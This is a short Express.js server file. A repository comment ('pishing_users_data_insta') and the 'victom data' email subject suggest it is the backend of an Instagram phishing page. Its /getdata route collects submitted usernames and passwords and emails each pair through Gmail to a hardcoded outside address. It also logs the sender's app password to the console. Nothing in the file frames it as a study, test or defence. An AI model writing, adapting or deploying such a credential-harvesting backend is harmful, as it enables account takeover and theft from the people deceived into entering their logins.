// git remote add origin https://github.com/sabihkahn/pishing_users_data_insta.git

import 'dotenv/config'
import express from 'express';
import nodemailer from 'nodemailer';
import cors from 'cors';
const app = express();


// Middleware
app.use(express.json());
app.use(express.static('public'))
app.use(express.urlencoded({ extended: true }));
app.use(cors({origin:"*"}))
// Environment variables (✅ for security)
const senderEmail = process.env.gmail_user
const appPassword = process.env.app_pass
console.log(senderEmail,appPassword);

async function sendthemail(name,pass){
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: senderEmail,
            pass: appPassword,
        },
    });

    const mailOptions = {
        from: senderEmail,
        to: 'sabihop56@gmail.com', // Your destination email
        subject: `victom data has sent you a message`,
        text: `username :==> ${name}  :: password :==> ${pass} `,
    };

    // Send email
    const info = await transporter.sendMail(mailOptions);
    console.log('✅ Email sent:', info.response);

}

app.get('/',async (req,res)=>{
    try {
        res.send('./public/index.html')
    } catch (error) {
        console.log(error);
        res.send("cant render the html page")
        
    }
})


app.post("/getdata",async(req,res)=>{
    try {
         const {username,pass} = req.body

        await sendthemail(username,pass)  

        res.send('yep ok all ')

    } catch (error) {
        console.log(error);
        res.send("failed to send email")
        
    }
})

// app.listen(3000,()=>{
//     console.log('server is running on port http://localhost:3000');
    
// })
export default app